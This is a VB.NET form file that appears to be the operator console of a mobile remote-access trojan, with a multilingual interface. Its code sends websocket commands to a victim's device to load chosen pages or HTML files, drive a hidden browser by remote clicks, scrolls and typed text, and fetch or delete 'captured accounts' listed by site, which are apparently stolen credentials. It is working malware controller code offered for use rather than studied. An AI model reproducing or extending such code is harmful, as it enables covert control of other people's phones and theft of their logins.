Imports System.IO

Public Class WebBrowser

    Public Btcli As BTClient
    Public SiteData As New Dictionary(Of String, String)
    Private HB_isDown As Boolean = False
    Private HB_isClick As Boolean = False
    Private HB_trackPoints As New List(Of Point)
    Private HB_startX As Integer
    Private HB_startY As Integer
    Private Const HBdragThreshold As Integer = 5

    ' Replace with the actual width and height of your browsscreen equivalent
    Private Const targetWidth As Integer = 720
    Private Const targetHeight As Integer = 1280

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                maintabs.TabPages(0).Text = "مراقبة"
                maintabs.TabPages(1).Text = "الخفي"
                maintabs.TabPages(2).Text = "الحسابات"
                monitorinput.Watermark = "رابط الموقع"
                urlinputhiden.Watermark = "رابط الموقع"
                selcthtmlbtn.Text = "ملف HTML"
                strtmonitor.Text = "البدء"
                refpasses.Text = "تحديث"
                dellall.Text = "حذف الكل"
                combositespass.Text = "اختر رابط الموقع"
                passtextlog.Text = "• إضغط على تحديث لتحميل البيانات."
                Exit Select
            Case "CN" ' Chinese
                maintabs.TabPages(0).Text = "监控"
                maintabs.TabPages(1).Text = "隐藏"
                maintabs.TabPages(2).Text = "账户"
                monitorinput.Watermark = "网站链接"
                urlinputhiden.Watermark = "网站链接"
                selcthtmlbtn.Text = "HTML 文件"
                strtmonitor.Text = "开始"
                refpasses.Text = "刷新"
                dellall.Text = "删除所有"
                combositespass.Text = "选择网站链接"
                passtextlog.Text = "• 单击刷新以加载数据。"
                Exit Select

            Case "RU" ' Russian
                maintabs.TabPages(0).Text = "Мониторинг"
                maintabs.TabPages(1).Text = "Скрытый"
                maintabs.TabPages(2).Text = "Аккаунты"
                monitorinput.Watermark = "Ссылка на сайт"
                urlinputhiden.Watermark = "Ссылка на сайт"
                selcthtmlbtn.Text = "HTML файл"
                strtmonitor.Text = "Начать"
                refpasses.Text = "Обновить"
                dellall.Text = "Удалить все"
                combositespass.Text = "Выберите ссылку на сайт"
                passtextlog.Text = "• Нажмите Обновить, чтобы загрузить данные."
                Exit Select

            Case "TR" ' Turkish
                maintabs.TabPages(0).Text = "İzleme"
                maintabs.TabPages(1).Text = "Gizli"
                maintabs.TabPages(2).Text = "Hesaplar"
                monitorinput.Watermark = "Web sitesi bağlantısı"
                urlinputhiden.Watermark = "Web sitesi bağlantısı"
                selcthtmlbtn.Text = "HTML Dosyası"
                strtmonitor.Text = "Başlat"
                refpasses.Text = "Yenile"
                dellall.Text = "Hepsini Sil"
                combositespass.Text = "Web sitesi bağlantısı seçin"
                passtextlog.Text = "• Verileri yüklemek için Yenile'ye tıklayın."
                Exit Select
            Case "SP" ' Spanish
                maintabs.TabPages(0).Text = "Monitoreo"
                maintabs.TabPages(1).Text = "Oculto"
                maintabs.TabPages(2).Text = "Cuentas"
                monitorinput.Watermark = "Enlace del sitio web"
                urlinputhiden.Watermark = "Enlace del sitio web"
                selcthtmlbtn.Text = "Archivo HTML"
                strtmonitor.Text = "Iniciar"
                refpasses.Text = "Actualizar"
                dellall.Text = "Eliminar todo"
                combositespass.Text = "Seleccione el enlace del sitio web"
                passtextlog.Text = "• Haga clic en Actualizar para cargar los datos."
                Exit Select

            Case "PR" ' Brazilian Portuguese
                maintabs.TabPages(0).Text = "Monitoramento"
                maintabs.TabPages(1).Text = "Oculto"
                maintabs.TabPages(2).Text = "Contas"
                monitorinput.Watermark = "Link do site"
                urlinputhiden.Watermark = "Link do site"
                selcthtmlbtn.Text = "Arquivo HTML"
                strtmonitor.Text = "Iniciar"
                refpasses.Text = "Atualizar"
                dellall.Text = "Excluir tudo"
                combositespass.Text = "Selecione o link do site"
                passtextlog.Text = "• Clique em Atualizar para carregar os dados."
                Exit Select

            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub

    Private Sub comboqultz_SelectedIndexChanged(sender As Object, e As EventArgs) Handles combotyps.SelectedIndexChanged


        If combotyps.Text = "From URL" Then
            monitorinput.Watermark = "Website link"
            selcthtmlbtn.Enabled = False
            selcthtmlbtn.Visible = False
        ElseIf combotyps.Text = "From File" Then
            monitorinput.Watermark = "Select .html file only"
            selcthtmlbtn.Enabled = True
            selcthtmlbtn.Visible = True
        Else
            monitorinput.Watermark = "..."
            selcthtmlbtn.Enabled = False
            selcthtmlbtn.Visible = False

        End If
    End Sub

    Private Sub strtmonitor_Click(sender As Object, e As EventArgs) Handles strtmonitor.Click

        Dim loadtype As String = ""

        If combotyps.Text = "From URL" Then
            loadtype = "u"
        ElseIf combotyps.Text = "From File" Then
            loadtype = "f"
        Else
            BTAlerter.infos("Select view type")
            Exit Sub
        End If

        Dim loaddata As String = ""

        Select Case loadtype
            Case "u"
                loaddata = monitorinput.Text
                If isEmpty(loaddata) Then
                    BTAlerter.infos("Enter website link to open")
                    Exit Sub
                End If
            Case "f"
                Dim htmlpath As String = monitorinput.Text
                If Not System.IO.File.Exists(htmlpath) Then
                    BTAlerter.infos("Could not file selected html file")
                    Exit Sub
                End If
                Dim htmlcontext As String = File.ReadAllText(htmlpath)
                If isEmpty(htmlcontext) Then
                    BTAlerter.infos("html file not vaild (empty)")
                    Exit Sub
                End If

                loaddata = ToBase64(htmlcontext)

            Case Else
                BTAlerter.infos("Select view type")
                Exit Sub
        End Select


        Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "brows"},
                             {"subc", "n"},
                             {"extdata", loaddata},
                             {"ltype", loadtype}
                        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Private Sub WebBrowser_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        Me.mytitle.Text = Browserstr & " | " & Btcli.name & " | " & Btcli.country
        translateme()
        statetimer.Start()
    End Sub
    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Browserstr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Browserstr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        passtextlog.Text = "• Click Refresh to load captured accounts."
    End Sub


    Private Sub refpasses_Click(sender As Object, e As EventArgs) Handles refpasses.Click
        Dim chatData As New Dictionary(Of String, Object) From {
                             {"msg", "brows"},
                             {"subc", "n"},
                             {"extdata", "0"},
                             {"ltype", "lp"},
                             {"lfor", "wbbrow"}
                        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub dellall_Click(sender As Object, e As EventArgs) Handles dellall.Click
        If MyMsg.Show("Delect Accounts?", "Are you sure you want to completely delete accounts ?", msgtype.Confirm, True) = DialogResult.OK Then
            Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "brows"},
                            {"subc", "n"},
                            {"extdata", "0"},
                            {"ltype", "cp"}
                       }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        End If
    End Sub

    Private Sub combositespass_SelectedIndexChanged(sender As Object, e As EventArgs) Handles combositespass.SelectedIndexChanged
        Dim selectedSite As String = combositespass.Text

        If selectedSite = "All" Then
            ' Show aggregated log
            passtextlog.Text = String.Join("", SiteData.Values)
        ElseIf SiteData.ContainsKey(selectedSite) Then
            ' Show specific site's log
            passtextlog.Text = SiteData(selectedSite)
        Else
            passtextlog.Text = "No data available for this site."
        End If
    End Sub

    Private Sub DrakeUITextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles urlinputhiden.KeyDown
        If e.KeyCode = Keys.Enter Then
            Dim sendtext As String = urlinputhiden.Text

            e.SuppressKeyPress = True

            If isEmpty(sendtext) Then
                BTAlerter.infos("Enter website link first")
                Return
            End If

            Dim useragent As String = BTRegistry.GetValue(BTSettings.UserAgent, "m")

            Dim allpaket As String = ToBase64(sendtext & "<:CS:>" & useragent)

            Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "brows"},
                            {"subc", "h"},
                            {"extdata", allpaket},
                            {"bcom", "1"}'start
                       }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        End If
    End Sub

    Private Sub DrakeUIButtonIcon3_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon3.Click

        Dim allpaket As String = ToBase64("nav<:CS:>0<:CS:>") 'go back

        Dim chatData As New Dictionary(Of String, Object) From {
                          {"msg", "brows"},
                          {"subc", "h"},
                          {"extdata", allpaket},
                          {"bcom", "3"}'command
                     }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon4_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon4.Click
        Dim allpaket As String = ToBase64("nav<:CS:>1<:CS:>") 'go forward

        Dim chatData As New Dictionary(Of String, Object) From {
                          {"msg", "brows"},
                          {"subc", "h"},
                          {"extdata", allpaket},
                          {"bcom", "3"}'command
                     }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon5_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon5.Click
        Dim allpaket As String = ToBase64("nav<:CS:>2<:CS:>") 'go Rrefresh

        Dim chatData As New Dictionary(Of String, Object) From {
                          {"msg", "brows"},
                          {"subc", "h"},
                          {"extdata", allpaket},
                          {"bcom", "3"}'command
                     }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub inputtext_KeyDown(sender As Object, e As KeyEventArgs) Handles inputtext.KeyDown
        If e.KeyCode = Keys.Enter Then
            Dim sendtext As String = inputtext.Text

            e.SuppressKeyPress = True

            If isEmpty(sendtext) Then
                Dim enterpacket As String = ToBase64($"enter<:CS:>") 'paste text

                Dim enterdata As New Dictionary(Of String, Object) From {
                          {"msg", "brows"},
                          {"subc", "h"},
                          {"extdata", enterpacket},
                          {"bcom", "3"}'command
                     }
                BTEngine.commands(enterdata, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                Return
            End If

            Dim allpaket As String = ToBase64($"text<:CS:>{sendtext}<:CS:>") 'paste text

            Dim chatData As New Dictionary(Of String, Object) From {
                          {"msg", "brows"},
                          {"subc", "h"},
                          {"extdata", allpaket},
                          {"bcom", "3"}'command
                     }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

            inputtext.Text = ""

        End If
    End Sub

    Private Sub viewhidden_MouseDown(sender As Object, e As MouseEventArgs) Handles viewhidden.MouseDown
        If e.Button = MouseButtons.Left Then
            HB_trackPoints.Clear()
            HB_startX = e.X
            HB_startY = e.Y
            HB_trackPoints.Add(New Point(HB_startX, HB_startY))
            HB_isDown = True
            HB_isClick = True
        End If
    End Sub

    Private Sub viewhidden_MouseMove(sender As Object, e As MouseEventArgs) Handles viewhidden.MouseMove
        If HB_isDown Then
            Dim dx As Integer = Math.Abs(e.X - HB_startX)
            Dim dy As Integer = Math.Abs(e.Y - HB_startY)
            If dx > HBdragThreshold OrElse dy > HBdragThreshold Then
                HB_isClick = False
                If e.X > 0 AndAlso e.Y > 0 Then
                    HB_trackPoints.Add(New Point(e.X, e.Y))
                End If
            End If
        End If
    End Sub

    Private Sub viewhidden_MouseUp(sender As Object, e As MouseEventArgs) Handles viewhidden.MouseUp
        HB_isDown = False

        Dim currentW As Integer = viewhidden.Width
        Dim currentH As Integer = viewhidden.Height

        If HB_isClick Then
            ' Handle single click
            Dim x As Integer = Math.Round(HB_startX * (targetWidth / currentW))
            Dim y As Integer = Math.Round(HB_startY * (targetHeight / currentH))


            Dim allpaket As String = ToBase64($"click<:CS:>{x}<:CS:>{y}<:CS:>") 'click

            Dim chatData As New Dictionary(Of String, Object) From {
                          {"msg", "brows"},
                          {"subc", "h"},
                          {"extdata", allpaket},
                          {"bcom", "3"}'command
                     }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

        Else
            ' Handle drag
            If HB_trackPoints.Count > 0 Then
                HB_trackPoints.Add(New Point(e.X, e.Y))

                Dim scaledPoints = HB_trackPoints.Select(Function(p) New Point(
                    Math.Round(p.X * (targetWidth / currentW)),
                    Math.Round(p.Y * (targetHeight / currentH))
                )).ToList()

                Dim pointString = String.Join(":", scaledPoints.Select(Function(p) $"({p.X}, {p.Y})"))


                Dim allpaket As String = ToBase64($"scroll<:CS:>{pointString}<:CS:>") 'scroll

                Dim chatData As New Dictionary(Of String, Object) From {
                              {"msg", "brows"},
                              {"subc", "h"},
                              {"extdata", allpaket},
                              {"bcom", "3"}'command
                         }
                BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

            End If
        End If
    End Sub

    Private Sub stophdbbtn_Click(sender As Object, e As EventArgs) Handles stophdbbtn.Click
        If MyMsg.Show("Close tab", "Stop and close hidden browser ?", msgtype.Confirm, True) = DialogResult.OK Then
            Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "brows"},
                            {"subc", "h"},
                            {"extdata", "0"},
                            {"bcom", "0"}'stop
                       }
            BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
        End If
    End Sub

    Private Sub selcthtmlbtn_Click(sender As Object, e As EventArgs) Handles selcthtmlbtn.Click
        Dim openFileDialog As New OpenFileDialog()

        ' Set the filter to allow only .html files
        openFileDialog.Filter = "HTML Files (*.html)|*.html|All Files (*.*)|*.*"
        openFileDialog.Title = "Select an HTML File"

        ' Show the dialog and check if the user selected a file
        If openFileDialog.ShowDialog() = DialogResult.OK Then
            ' Retrieve the selected file path
            Dim selectedFilePath As String = openFileDialog.FileName
            monitorinput.Text = selectedFilePath

        End If
    End Sub
End Class